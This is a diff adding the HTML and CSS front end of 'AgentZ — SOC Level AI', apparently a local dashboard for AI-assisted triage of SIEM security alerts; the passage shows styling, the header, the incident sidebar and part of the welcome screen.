@@ -1,0 +1,2005 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="AgentZ — SOC Level AI. Local AI-powered security incident analysis. All processing stays on your machine.">
+<meta name="theme-color" content="#080b10">
+<title>AgentZ — SOC Level AI</title>
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *; img-src 'self' data:; font-src 'self' data: https://fonts.gstatic.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap"></noscript>
+<style>
+/* ── FONTS: Inter + JetBrains Mono via Google Fonts CDN; fallback to system stack if offline ── */
+
+:root {
+  /* ── Dark (default) backgrounds ── */
+  --bg:          #080b10;
+  --bg2:         #0d1117;
+  --bg3:         #111720;
+  --bg4:         #161d2a;
+  --border:      #1e2736;
+  --border2:     #273044;
+  --text:        #e2e8f0;
+  --text2:       #8b97aa;
+  --text3:       #4a5568;
+
+  /* ── Blue accent palette ── */
+  --blue:        #3b82f6;
+  --blue-dim:    rgba(59,130,246,0.12);
+  --blue-glow:   0 0 24px rgba(59,130,246,0.18);
+  --purple:      #a78bfa;
+  --purple-dim:  rgba(167,139,250,0.12);
+  --cyan:        #22d3ee;
+
+  /* ── Semantic colours ── */
+  --green:       #22c55e;
+  --green-dim:   rgba(34,197,94,0.12);
+  --red:         #ef4444;
+  --red-dim:     rgba(239,68,68,0.12);
+  --orange:      #f59e0b;
+  --orange-dim:  rgba(245,158,11,0.12);
+
+  /* ── Spacing & layout ── */
+  --r:           6px;
+  --r2:          10px;
+  --r3:          14px;
+  --mono:        'JetBrains Mono', 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+  --sans:        'Inter', 'Segoe UI', system-ui, sans-serif;
+  --sidebar-w:   300px;
+  --header-h:    58px;
+  --console-h:   0px;
+  --drawer-w:    420px;
+}
+
+/* ══════════════════════════════════════
+   LIGHT MODE
+══════════════════════════════════════ */
+body.light {
+  --bg:     #f0f4f8;
+  --bg2:    #ffffff;
+  --bg3:    #e8eef5;
+  --bg4:    #dde5ef;
+  --border: #c8d4e3;
+  --border2:#b0bfd4;
+  --text:   #0d1117;
+  --text2:  #3d4f68;
+  --text3:  #7a8fa8;
+}
+body.light { background: var(--bg); color: var(--text); }
+body.light .header { background: rgba(253,248,242,0.94); }
+body.light .sidebar { background: var(--bg2); border-color: var(--border); }
+body.light .inc-card { background: var(--bg3); border-color: var(--border); }
+body.light .inc-card:hover { border-color: var(--blue); }
+body.light .drawer { background: var(--bg2); }
+body.light .inp, body.light .sel, body.light .textarea { background: var(--bg3); border-color: var(--border2); color: var(--text); }
+body.light .btn-ghost { background: var(--bg3); border-color: var(--border2); color: var(--text2); }
+body.light .btn-ghost:hover { border-color: var(--blue); color: var(--blue); }
+body.light .ai-box { background: var(--bg3); border-color: var(--border); }
+body.light .raw-box { background: var(--bg); border-color: var(--border); }
+body.light .console-bar { background: var(--bg2); border-color: var(--border); }
+body.light .modal { background: var(--bg2); }
+body.light body::after { display: none; } /* no scanlines in light mode */
+
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+html { font-size: 14px; }
+
+body {
+  font-family: var(--sans);
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* Subtle scanline texture */
+body::after {
+  content: '';
+  position: fixed; inset: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255,255,255,0.008) 2px, rgba(255,255,255,0.008) 4px);
+  pointer-events: none; z-index: 0;
+}
+
+::-webkit-scrollbar { width: 5px; height: 5px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
+
+/* ══════════════════════════════════════
+   HEADER
+══════════════════════════════════════ */
+.header {
+  position: fixed;
+  top: 0; left: 0; right: 0;
+  height: var(--header-h);
+  background: rgba(8,11,16,0.92);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center;
+  padding: 0 18px;
+  gap: 16px;
+  z-index: 200;
+}
+
+.logo {
+  display: flex; align-items: center; gap: 10px;
+  text-decoration: none; color: inherit;
+  flex-shrink: 0;
+}
+
+.logo-mark {
+  width: 34px; height: 34px;
+  background: linear-gradient(135deg, var(--blue), var(--purple));
+  border-radius: var(--r2);
+  display: flex; align-items: center; justify-content: center;
+  font-family: var(--mono); font-weight: 700; font-size: 15px;
+  color: #fff; letter-spacing: -1px;
+  box-shadow: 0 0 16px rgba(59,130,246,0.3);
+  flex-shrink: 0;
+}
+
+.logo-names { line-height: 1.15; }
+.logo-name { font-weight: 700; font-size: 15px; letter-spacing: -0.3px; }
+.logo-motto {
+  font-size: 10px; letter-spacing: 2px; text-transform: uppercase;
+  color: var(--blue); font-family: var(--mono); font-weight: 500;
+  opacity: 0.9;
+}
+
+.header-divider {
+  width: 1px; height: 24px;
+  background: var(--border);
+  flex-shrink: 0;
+}
+
+.privacy-badge {
+  display: flex; align-items: center; gap: 5px;
+  font-size: 11px; color: var(--green);
+  font-family: var(--mono); font-weight: 500;
+  padding: 4px 10px;
+  background: var(--green-dim);
+  border: 1px solid rgba(34,197,94,0.2);
+  border-radius: 20px;
+  white-space: nowrap;
+}
+
+.header-spacer { flex: 1; }
+
+.status-row { display: flex; align-items: center; gap: 8px; }
+
+.status-chip {
+  display: flex; align-items: center; gap: 5px;
+  padding: 4px 10px;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 20px;
+  font-size: 11px; font-family: var(--mono); font-weight: 500;
+  color: var(--text2);
+  transition: all 0.2s;
+  white-space: nowrap;
+}
+.status-chip.ok    { border-color: rgba(34,197,94,0.3); color: var(--green); background: var(--green-dim); }
+.status-chip.bad   { border-color: rgba(239,68,68,0.3); color: var(--red); background: var(--red-dim); }
+.status-chip.live  { border-color: rgba(245,158,11,0.3); color: var(--orange); background: var(--orange-dim); }
+
+.status-dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: currentColor;
+}
+.status-chip.ok .status-dot,
+.status-chip.live .status-dot { animation: blink 2s ease-in-out infinite; }
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+.icon-btn {
+  width: 34px; height: 34px;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: var(--r);
+  display: flex; align-items: center; justify-content: center;
+  cursor: pointer; font-size: 16px;
+  transition: all 0.2s; color: var(--text2);
+  flex-shrink: 0;
+}
+.icon-btn:hover { border-color: var(--blue); color: var(--text); background: var(--blue-dim); }
+
+/* ══════════════════════════════════════
+   LAYOUT
+══════════════════════════════════════ */
+.app {
+  display: flex;
+  padding-top: var(--header-h);
+  min-height: 100vh;
+  position: relative; z-index: 1;
+}
+
+/* ── SIDEBAR ── */
+.sidebar {
+  width: var(--sidebar-w);
+  flex-shrink: 0;
+  border-right: 1px solid var(--border);
+  background: var(--bg2);
+  display: flex; flex-direction: column;
+  height: calc(100vh - var(--header-h));
+  position: sticky;
+  top: var(--header-h);
+  overflow: hidden;
+}
+
+.sidebar-header {
+  padding: 14px 14px 10px;
+  border-bottom: 1px solid var(--border);
+  flex-shrink: 0;
+}
+
+.sidebar-title {
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--text3);
+  font-family: var(--mono);
+  font-weight: 600;
+  display: flex; align-items: center;
+  justify-content: space-between;
+  margin-bottom: 10px;
+}
+
+.sidebar-title-right { display: flex; align-items: center; gap: 6px; }
+
+.search-input {
+  width: 100%;
+  padding: 7px 10px 7px 30px;
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: var(--r);
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 12px;
+  outline: none;
+  transition: border-color 0.2s;
+  position: relative;
+}
+.search-input:focus { border-color: var(--blue); box-shadow: var(--blue-glow); }
+.search-wrap { position: relative; }
+.search-icon {
+  position: absolute; left: 9px; top: 50%;
+  transform: translateY(-50%);
+  color: var(--text3); font-size: 13px; pointer-events: none;
+}
+
+.filter-row {
+  display: flex; gap: 4px; margin-top: 8px; flex-wrap: wrap;
+}
+
+.filter-chip {
+  font-size: 10px; font-family: var(--mono);
+  padding: 2px 8px; border-radius: 10px;
+  border: 1px solid var(--border);
+  background: none;
+  color: var(--text3); cursor: pointer;
+  transition: all 0.15s;
+}
+.filter-chip:hover { color: var(--text2); border-color: var(--border2); }
+.filter-chip.active-all    { background: var(--blue-dim); border-color: rgba(59,130,246,0.4); color: var(--blue); }
+.filter-chip.active-crit   { background: var(--red-dim); border-color: rgba(239,68,68,0.4); color: var(--red); }
+.filter-chip.active-high   { background: var(--orange-dim); border-color: rgba(245,158,11,0.4); color: var(--orange); }
+.filter-chip.active-med    { background: var(--blue-dim); border-color: rgba(59,130,246,0.4); color: var(--blue); }
+
+.incident-list { flex: 1; overflow-y: auto; padding: 8px; }
+
+.empty-list {
+  display: flex; flex-direction: column; align-items: center;
+  justify-content: center; height: 220px; gap: 10px;
+  color: var(--text3); font-size: 12px; text-align: center; padding: 20px;
+}
+.empty-list-icon { font-size: 32px; opacity: 0.4; }
+
+.inc-card {
+  padding: 11px 12px;
+  border-radius: var(--r2);
+  cursor: pointer;
+  border: 1px solid transparent;
+  margin-bottom: 4px;
+  transition: all 0.2s;
+  position: relative;
+  overflow: hidden;
+}
+.inc-card::before {
+  content: '';
+  position: absolute; left: 0; top: 0; bottom: 0;
+  width: 3px;
+  border-radius: var(--r) 0 0 var(--r);
+  background: var(--text3);
+  transition: background 0.2s;
+}
+.inc-card.sev-critical::before { background: var(--red); }
+.inc-card.sev-high::before     { background: var(--orange); }
+.inc-card.sev-medium::before   { background: var(--blue); }
+.inc-card.sev-low::before      { background: var(--green); }
+.inc-card.sev-info::before     { background: var(--text3); }
+
+.inc-card:hover { background: var(--bg3); border-color: var(--border2); }
+.inc-card.selected { background: var(--bg4); border-color: var(--blue); box-shadow: var(--blue-glow); }
+
+.inc-card-top {
+  display: flex; align-items: flex-start; gap: 8px; margin-bottom: 5px;
+}
+.inc-card-title {
+  font-size: 12px; font-weight: 600; line-height: 1.4; flex: 1;
+  display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical;
+  overflow: hidden;
+}
+
+.sev-tag {
+  font-size: 9px; font-family: var(--mono); font-weight: 700;
+  text-transform: uppercase; letter-spacing: 0.5px;
+  padding: 2px 6px; border-radius: 4px; flex-shrink: 0;
+}
+.sev-tag.critical { background: var(--red-dim); color: var(--red); }
+.sev-tag.high     { background: var(--orange-dim); color: var(--orange); }
+.sev-tag.medium   { background: var(--blue-dim); color: var(--blue); }
+.sev-tag.low      { background: var(--green-dim); color: var(--green); }
+.sev-tag.info     { background: rgba(139,151,170,0.1); color: var(--text3); }
+
+.inc-card-meta {
+  display: flex; gap: 8px; align-items: center;
+  font-size: 10px; font-family: var(--mono); color: var(--text3);
+}
+
+.inc-status-dot {
+  width: 5px; height: 5px; border-radius: 50%;
+  flex-shrink: 0;
+}
+.inc-status-dot.pending   { background: var(--text3); }
+.inc-status-dot.analyzing { background: var(--orange); animation: blink 1s infinite; }
+.inc-status-dot.analyzed  { background: var(--green); }
+.inc-status-dot.error     { background: var(--red); }
+
+/* ── MAIN ── */
+.main {
+  flex: 1;
+  display: flex; flex-direction: column;
+  overflow: hidden;
+  min-height: calc(100vh - var(--header-h));
+}
+
+/* Welcome / empty state */
+.welcome {
+  flex: 1; display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  padding: 40px 24px;
+  text-align: center;
+  gap: 8px;
+}
+
+.welcome-shield {
+  width: 80px; height: 80px;
+  background: linear-gradient(135deg, var(--blue-dim), var(--purple-dim));
+  border: 1px solid var(--border2);
+  border-radius: 24px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 36px; margin-bottom: 8px;
+}
+
+.welcome h1 {
+  font-size: 22px; font-weight: 700; letter-spacing: -0.5px;
+  color: var(--text);
+}
+.welcome-motto {
+  font-family: var(--mono); font-size: 11px;
+  letter-spacing: 3px; text-transform: uppercase;
+  color: var(--blue); margin-bottom: 8px;
+}
+.welcome p {
+  font-size: 13px; color: var(--text2); line-height: 1.7;
+  max-width: 480px;
+}
+
+.privacy-notice {
+  display: flex; align-items: center; gap: 6px;
+  background: var(--green-dim);
+  border: 1px solid rgba(34,197,94,0.2);
+  border-radius: var(--r2);
+  padding: 10px 16px;
+  font-size: 12px; color: var(--green);
+  font-family: var(--mono); margin-top: 12px;
+}
+
+.steps {
+  display: grid; grid-template-columns: repeat(3, 1fr);
+  gap: 12px; max-width: 560px; width: 100%; margin-top: 20px;
+}
+
+.step {
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: var(--r2);
+  padding: 16px 14px;
+  text-align: left;
+  transition: all 0.2s;
+}
+.step:hover { border-color: var(--blue); transform: translateY(-2px); box-shadow: var(--blue-glow); }
+.step-num {
+  width: 22px; height: 22px; border-radius: 50%;
+  background: var(--blue-dim); color: var(--blue);
+  font-size: 11px; font-weight: 700; font-family: var(--mono);
+  display: inline-flex; align-items: center; justify-content: center;
+  margin-bottom: 8px;
+}
+.step h3 { font-size: 12px; font-weight: 600; margin-bottom: 4px; }
+.step p  { font-size: 11px; color: var(--text2); line-height: 1.5; }
+
+.quick-start-btn {
+  margin-top: 16px;
+  padding: 10px 24px;
+  background: linear-gradient(135deg, var(--blue), #6366f1);
+  border: none; border-radius: var(--r2);
+  color: #fff; font-size: 13px; font-weight: 600;
+  cursor: pointer; font-family: var(--sans);
+  box-shadow: 0 4px 16px rgba(59,130,246,0.35);
+  transition: all 0.2s;
+}
+.quick-start-btn:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 6px 24px rgba(59,130,246,0.45);
+}
+
+/* Detail panel */
+.detail {
+  flex: 1; overflow-y: auto; padding: 22px 28px;
+  display: none;
+}
+
+.detail-head {
+  display: flex; align-items: flex-start; gap: 14px;
+  margin-bottom: 22px;
+}
+
+.detail-head-info { flex: 1; min-width: 0; }
+.detail-title {
+  font-size: 18px; font-weight: 700; line-height: 1.35;
+  letter-spacing: -0.3px; word-break: break-word;
+}
+.detail-meta {
+  display: flex; flex-wrap: wrap; gap: 10px; margin-top: 8px;
+}
+.detail-tag {
+  font-size: 11px; font-family: var(--mono);
+  color: var(--text2); display: flex; align-items: center; gap: 4px;
+}
+
+.section { margin-bottom: 24px; }
+
+.section-label {
+  font-size: 10px; letter-spacing: 2px; text-transform: uppercase;
+  color: var(--text3); font-family: var(--mono); font-weight: 600;
+  margin-bottom: 10px;
+  display: flex; align-items: center; gap: 10px;
+}
+.section-label::after {
+  content: ''; flex: 1; height: 1px; background: var(--border);
+}
+
+.ai-box {
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: var(--r2);
+  padding: 18px 20px;
+  font-size: 13px; line-height: 1.75;
+  color: var(--text2); white-space: pre-wrap; word-break: break-word;
+}
+
+.analyzing-row {
+  display: flex; align-items: center; gap: 10px;
+  padding: 18px;
+  color: var(--orange); font-size: 13px; font-family: var(--mono);
+  background: var(--bg3); border: 1px solid var(--border); border-radius: var(--r2);
+}
+
+.spinner {
+  width: 16px; height: 16px;
+  border: 2px solid var(--border2);
+  border-top-color: var(--orange);
+  border-radius: 50%;
+  animation: spin 0.7s linear infinite;
+  flex-shrink: 0;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.raw-box {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: var(--r2);
+  padding: 14px 16px;
+  font-family: var(--mono); font-size: 11px;
+  color: var(--text2); overflow: auto;
+  max-height: 360px; white-space: pre;
+}
+
+.action-row { display: flex; gap: 8px; flex-wrap: wrap; }
+
+.btn {
+  display: inline-flex; align-items: center; gap: 6px;
+  padding: 8px 16px;
+  border-radius: var(--r2);
+  font-size: 12px; font-weight: 500;
+  font-family: var(--sans);
+  border: 1px solid transparent;
+  cursor: pointer; transition: all 0.2s;
+  white-space: nowrap;
+}
+.btn-primary {
+  background: linear-gradient(135deg, var(--blue), #6366f1);
+  color: #fff;
+  box-shadow: 0 2px 10px rgba(59,130,246,0.3);
+}
+.btn-primary:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 4px 16px rgba(59,130,246,0.4);
+}
+.btn-primary:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+
+.btn-ghost {
+  background: var(--bg3);
+  color: var(--text2);
+  border-color: var(--border);
+}
+.btn-ghost:hover { border-color: var(--border2); color: var(--text); }
+
+.btn-danger {
+  background: var(--red-dim);
+  color: var(--red);
+  border-color: rgba(239,68,68,0.25);
+}
+.btn-danger:hover { background: rgba(239,68,68,0.18); }
+
+/* ── CONSOLE (collapsible) ── */
+.console-bar {
+  border-top: 1px solid var(--border);
+  background: var(--bg2);
+  flex-shrink: 0;
+  transition: height 0.25s ease;
+}
+
+.console-toggle {
+  display: flex; align-items: center; gap: 8px;
+  padding: 6px 14px;
+  cursor: pointer; font-size: 11px;
+  font-family: var(--mono); color: var(--text3);
+  user-select: none;
+  transition: color 0.2s;
+}
+.console-toggle:hover { color: var(--text2); }
+.console-arrow { transition: transform 0.25s; font-size: 10px; }
+.console-bar.open .console-arrow { transform: rotate(180deg); }
+
+.console-body {
+  height: 130px; overflow-y: auto;
+  padding: 0 14px 8px;
+  display: none;
+}
+.console-bar.open .console-body { display: block; }
+
+.log-row { display: flex; gap: 6px; font-size: 11px; font-family: var(--mono); line-height: 1.9; }
+.log-t { color: var(--text3); flex-shrink: 0; }
+.log-lv {
+  padding: 0 5px; border-radius: 3px;
+  font-size: 9px; font-weight: 700; flex-shrink: 0;
+  align-self: flex-start; margin-top: 4px;
+}
+.log-lv.info    { background: var(--blue-dim); color: var(--blue); }
+.log-lv.warn    { background: var(--orange-dim); color: var(--orange); }
+.log-lv.error   { background: var(--red-dim); color: var(--red); }
+.log-lv.success { background: var(--green-dim); color: var(--green); }
+.log-m { color: var(--text2); word-break: break-all; }
+
+/* ══════════════════════════════════════
+   SETTINGS DRAWER
+══════════════════════════════════════ */
+.overlay {
+  position: fixed; inset: 0;
+  background: rgba(0,0,0,0.55);
+  backdrop-filter: blur(4px);
+  z-index: 300;
+  opacity: 0; pointer-events: none;
+  transition: opacity 0.25s;
+}
+.overlay.open { opacity: 1; pointer-events: all; }
+
+.drawer {
+  position: fixed;
+  top: 0; right: 0; bottom: 0;
+  width: var(--drawer-w);
+  background: var(--bg2);
+  border-left: 1px solid var(--border);
+  z-index: 301;
+  transform: translateX(100%);
+  transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  display: flex; flex-direction: column;
+  overflow: hidden;
+}
+.drawer.open { transform: translateX(0); }
+
+.drawer-head {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 18px 20px;
+  border-bottom: 1px solid var(--border);
+  flex-shrink: 0;
+}
+.drawer-title { font-size: 15px; font-weight: 600; }
+.drawer-close {
+  width: 28px; height: 28px;
+  background: var(--bg3); border: 1px solid var(--border);
+  border-radius: var(--r); cursor: pointer;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 14px; color: var(--text2);
+  transition: all 0.15s;
+}
+.drawer-close:hover { color: var(--text); border-color: var(--border2); }
+
+.drawer-body { flex: 1; overflow-y: auto; padding: 0 20px 24px; }
+
+.drawer-section {
+  padding-top: 20px; margin-bottom: 20px;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 20px;
+}
+.drawer-section:last-child { border-bottom: none; }
+
+.ds-title {
+  font-size: 10px; text-transform: uppercase; letter-spacing: 1.5px;
+  font-family: var(--mono); color: var(--text3); font-weight: 600;
+  margin-bottom: 14px; display: flex; align-items: center; gap: 8px;
+}
+
+.field { margin-bottom: 12px; }
+.field:last-child { margin-bottom: 0; }
+
+.field-label {
+  display: block; font-size: 12px; color: var(--text2);
+  font-weight: 500; margin-bottom: 5px;
+}
+.field-hint { font-size: 10px; color: var(--text3); margin-top: 3px; font-family: var(--mono); }
+.field-hint.ok    { color: var(--green); }
+.field-hint.warn  { color: var(--orange); }
+
+.inp, .sel, .textarea {
+  width: 100%;
+  padding: 8px 11px;
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: var(--r);
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 12px;
+  outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+.inp:focus, .sel:focus, .textarea:focus {
+  border-color: var(--blue);
+  box-shadow: var(--blue-glow);
+}
+.inp::placeholder { color: var(--text3); }
+
+.sel {
+  appearance: none;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%238b97aa'%3E%3Cpath d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+  background-repeat: no-repeat;
+  background-position: right 10px center;
+  padding-right: 28px;
+  cursor: pointer;
+}
+
+.textarea { resize: vertical; min-height: 90px; }
+
+.toggle-row {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 7px 0;
+}
+.toggle-lbl { font-size: 12px; color: var(--text2); }
+.toggle {
+  width: 34px; height: 18px;
+  background: var(--border2); border-radius: 9px;
+  position: relative; cursor: pointer;
+  transition: background 0.2s; flex-shrink: 0;
+}
+.toggle.on { background: var(--blue); }
+.toggle::after {
+  content: ''; position: absolute;
+  top: 2px; left: 2px;
+  width: 14px; height: 14px;
+  background: #fff; border-radius: 50%;
+  transition: transform 0.2s;
+}
+.toggle.on::after { transform: translateX(16px); }
+
+.btn-row { display: flex; gap: 8px; margin-top: 4px; }
+.btn-row .btn { flex: 1; justify-content: center; }
+
+.agent-row {
+  display: flex; gap: 8px; margin-top: 16px;
+}
+.agent-row .btn { flex: 1; justify-content: center; }
+
+/* ── CORS WARNING CALLOUT ── */
+.callout {
+  display: flex; gap: 10px;
+  padding: 12px 14px;
+  border-radius: var(--r);
+  font-size: 11px; line-height: 1.6;
+  font-family: var(--mono);
+  margin-bottom: 14px;
+}
+.callout.warn { background: var(--orange-dim); border: 1px solid rgba(245,158,11,0.25); color: var(--orange); }
+.callout.info { background: var(--blue-dim); border: 1px solid rgba(59,130,246,0.25); color: var(--blue); }
+.callout.green { background: var(--green-dim); border: 1px solid rgba(34,197,94,0.2); color: var(--green); }
+
+/* ── TOASTS ── */
+.toast-wrap {
+  position: fixed; top: 68px; right: 14px;
+  z-index: 500;
+  display: flex; flex-direction: column; gap: 6px;
+}
+
+.toast {
+  background: var(--bg4);
+  border: 1px solid var(--border2);
+  border-radius: var(--r2);
+  padding: 10px 14px;
+  font-size: 12px; color: var(--text);
+  box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+  min-width: 240px; max-width: 320px;
+  animation: slide-in 0.25s ease-out;
+  display: flex; align-items: center; gap: 8px;
+}
+.toast.critical { border-left: 3px solid var(--red); }
+.toast.high     { border-left: 3px solid var(--orange); }
+.toast.info     { border-left: 3px solid var(--blue); }
+.toast.ok       { border-left: 3px solid var(--green); }
+
+@keyframes slide-in {
+  from { transform: translateX(110%); opacity: 0; }
+  to   { transform: translateX(0);    opacity: 1; }
+}
+
+/* ── MANUAL IMPORT MODAL ── */
+.modal-overlay {
+  position: fixed; inset: 0;
+  background: rgba(0,0,0,0.72);
+  backdrop-filter: blur(4px);
+  z-index: 400;
+  display: none;
+  align-items: center; justify-content: center;
+  padding: 16px;
+}
+.modal-overlay.open { display: flex; }
+
+.modal {
+  background: var(--bg2);
+  border: 1px solid var(--border2);
+  border-radius: var(--r3);
+  width: min(580px, 100%);
+  max-height: 88vh;
+  display: flex; flex-direction: column;
+  box-shadow: 0 24px 64px rgba(0,0,0,0.65);
+  animation: modal-in 0.2s ease-out;
+}
+@keyframes modal-in {
+  from { transform: scale(0.96) translateY(-10px); opacity: 0; }
+  to   { transform: scale(1)    translateY(0);     opacity: 1; }
+}
+
+.modal-head {
+  padding: 16px 18px 12px;
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; gap: 10px;
+  flex-shrink: 0;
+}
+.modal-head-icon { font-size: 18px; }
+.modal-title { flex: 1; font-size: 14px; font-weight: 600; letter-spacing: -0.3px; }
+.modal-subtitle { font-size: 11px; color: var(--text3); font-family: var(--mono); }
+.modal-close {
+  width: 26px; height: 26px;
+  border-radius: var(--r); background: var(--bg4);
+  border: 1px solid var(--border2);
+  display: flex; align-items: center; justify-content: center;
+  cursor: pointer; font-size: 12px; color: var(--text2);
+  transition: all 0.15s; flex-shrink: 0;
+}
+.modal-close:hover { background: var(--red-dim); border-color: var(--red); color: var(--red); }
+
+.modal-body {
+  flex: 1; overflow-y: auto;
+  padding: 16px 18px;
+  display: flex; flex-direction: column; gap: 12px;
+}
+.modal-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+
+.modal-foot {
+  padding: 12px 18px;
+  border-top: 1px solid var(--border);
+  display: flex; gap: 8px; justify-content: flex-end;
+  flex-shrink: 0;
+}
+
+/* ── COUNTER BADGE ── */
+.badge {
+  display: inline-flex; align-items: center; justify-content: center;
+  min-width: 17px; height: 17px; padding: 0 4px;
+  border-radius: 9px;
+  background: var(--red); color: #fff;
+  font-size: 9px; font-weight: 700; font-family: var(--mono);
+}
+
+/* ══════════════════════════════════════
+   RESPONSIVE
+══════════════════════════════════════ */
+@media (max-width: 720px) {
+  :root { --sidebar-w: 100%; --drawer-w: 100%; }
+  .app { flex-direction: column; }
+  .sidebar { position: relative; top: 0; height: auto; max-height: 45vh; width: 100%; border-right: none; border-bottom: 1px solid var(--border); }
+  .main { min-height: 55vh; }
+  .steps { grid-template-columns: 1fr; max-width: 340px; }
+  .privacy-badge { display: none; }
+  .header-divider { display: none; }
+}
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════════
+     HEADER
+══════════════════════════════════════ -->
+<header class="header">
+  <a class="logo" href="#" onclick="return false;">
+    <div class="logo-mark">Z</div>
+    <div class="logo-names">
+      <div class="logo-name">AgentZ</div>
+      <div class="logo-motto">SOC Level AI</div>
+    </div>
+  </a>
+
+  <div class="header-divider"></div>
+
+  <div class="privacy-badge">
+    <span>&#x1F512;</span> 100% Local — No Data Leaves Your Machine
+  </div>
+
+  <div class="header-spacer"></div>
+
+  <div class="status-row">
+    <div class="status-chip bad" id="chipOllama">
+      <span class="status-dot"></span>
+      <span id="chipOllamaText">AI: offline</span>
+    </div>
+    <div class="status-chip bad" id="chipPlatform">
+      <span class="status-dot"></span>
+      <span id="chipPlatformText">SIEM: off</span>
+    </div>
+    <div class="icon-btn" title="Import alert manually" onclick="openManualModal()">&#x1F4CB;</div>
+    <div class="icon-btn" id="themeBtn" title="Toggle light/dark mode" onclick="toggleTheme()">&#x263D;</div>
+    <div class="icon-btn" id="settingsBtn" title="Settings" onclick="openDrawer()">&#x2699;&#xFE0F;</div>
+    <div class="icon-btn" title="Inject demo alert" onclick="injectDemo()">&#x26A1;</div>
+  </div>
+</header>
+
+<!-- ══════════════════════════════════════
+     APP LAYOUT
+══════════════════════════════════════ -->
+<div class="app">
+
+  <!-- SIDEBAR: Incidents -->
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      <div class="sidebar-title">
+        <span>Incidents</span>
+        <div class="sidebar-title-right">
+          <span class="badge" id="incBadge" style="display:none">0</span>
+          <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;height:26px;" title="Import alert manually" onclick="openManualModal()">&#x1F4CB; Import</button>
+        </div>
+      </div>
+
+      <div class="search-wrap">
+        <span class="search-icon">&#x1F50D;</span>
+        <input class="search-input" id="searchInp" placeholder="Search incidents…" oninput="renderList()">
+      </div>
+
+      <div class="filter-row">
+        <button class="filter-chip active-all" data-sev="all" onclick="setFilter(this)">All</button>
+        <button class="filter-chip" data-sev="critical" onclick="setFilter(this)">Critical</button>
+        <button class="filter-chip" data-sev="high" onclick="setFilter(this)">High</button>
+        <button class="filter-chip" data-sev="medium" onclick="setFilter(this)">Med</button>
+      </div>
+    </div>
+
+    <div class="incident-list" id="incList">
+      <div class="empty-list" id="emptyList">
+        <div class="empty-list-icon">&#x1F6E1;&#xFE0F;</div>
+        <strong>No incidents yet</strong>
+        <span style="color:var(--text3)">Click &#x26A1; to inject a demo alert<br>or start the agent in Settings</span>
+      </div>
+    </div>
+  </aside>
+
+  <!-- MAIN -->
+  <main class="main">
+
+    <!-- Welcome / empty state -->
+    <div class="welcome" id="welcomeView">
+      <div class="welcome-shield">&#x1F916;</div>
+      <h1>AgentZ</h1>
+      <div class="welcome-motto">SOC Level AI</div>
+      <p>
+        AI-powered security incident triage that runs entirely on your machine.<br>
+        Connect your local Ollama model to any SIEM platform and get instant, actionable intelligence — with zero data leaving your network.
+      </p>
+      <div class="privacy-notice">
+        &#x2705; All AI inference runs locally via Ollama &mdash; your alerts never touch external servers
+      </div>
+
+      <div class="steps">
+        <div class="step">
+          <div class="step-num">1</div>
+          <h3>Configure</h3>
+          <p>Open Settings (&#x2699;) and add your Ollama URL, model, and SIEM API credentials.</p>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <h3>Start Agent</h3>
+          <p>Click Start in Settings. AgentZ will poll your SIEM and auto-analyze every new alert.</p>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <h3>Triage Faster</h3>
